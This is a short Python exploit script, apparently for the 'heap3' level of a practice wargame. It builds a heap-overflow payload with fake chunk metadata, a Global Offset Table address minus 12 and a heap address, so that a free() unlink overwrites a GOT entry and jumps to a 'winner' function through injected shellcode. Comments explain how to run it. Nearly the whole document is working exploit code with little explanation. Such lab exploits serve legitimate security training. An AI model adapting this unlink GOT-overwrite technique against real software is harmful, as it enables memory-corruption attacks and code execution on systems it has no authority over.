#!/usr/bin/python

import struct


#NOTE
#USE IT LIKE THIS.
#heap3 $(./heap3.py)
#NOTE
#IF NOT WORK U HAVE TO USE IT INSIDE GDB
MFFC = struct.pack("I" , 0xfffffffc)
#METADETA FOT THE FAKE CHUNK

GOT_PUT = struct.pack("I" , 0x804b128-0xc)
#The GLOBAL_OFFSET_TABLE Address for the print (- 12) becuose The Heap will add 12.
HEAP = struct.pack("I" , 0x804c010)
#Our Heap Address where the shellcode will be replaces in our case the WINNER function address.
SHELLCODE = "\xB8\x64\x88\x04\x08\xFF\xD0"


fpart = "A" * 8 + SHELLCODE

spart = "B" * 36 + "\x65"

tpart = "C" * 92 + MFFC + MFFC + GOT_PUT + HEAP

print fpart + " " + spart + " " + tpart
